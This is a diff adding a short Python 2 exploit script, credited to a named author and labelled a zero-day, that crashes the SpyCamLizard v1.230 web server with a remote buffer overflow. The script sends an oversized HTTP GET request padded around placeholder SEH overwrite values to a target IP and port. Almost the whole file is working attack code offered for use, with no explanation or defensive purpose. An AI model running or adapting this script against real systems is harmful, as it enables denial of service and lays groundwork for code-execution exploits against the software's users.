@@ -1,0 +1,36 @@
+import socket
+import sys
+
+author = '''
+  
+                ##############################################
+                #    Created: ScrR1pTK1dd13                  #
+                #    Name: Greg Priest                       #
+                #    Mail: ScR1pTK1dd13.slammer@gmail.com    # 
+                ##############################################
+  
+# Exploit Title: SpyCamLizard SC liz v1.230 Remote Buffer Overflow ZeroDay
+# Date: 2017.03.22
+# Exploit Author: Greg Priest
+# Version: SpyCamLizard v1.230
+# Tested on: Windows7 x64 HUN/ENG Enterprise
+'''
+
+print "SpyCamLizard DoS Exploit running!"
+ 
+host = "192.168.56.1"
+port = 80
+overflow = "A" * 1189
+nextSEH = "BBBB" 
+SEH = "CCCC" 
+overflow2= "D" * 3803
+
+crash = overflow+nextSEH+SEH+overflow2
+
+httpsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+httpsocket.connect((host,port))
+httpsocket.send("GET " + crash + " HTTP/1.0\r\n\r\n")
+httpsocket.close()
+
+
+print "SpyCamLizard shutted down!" 
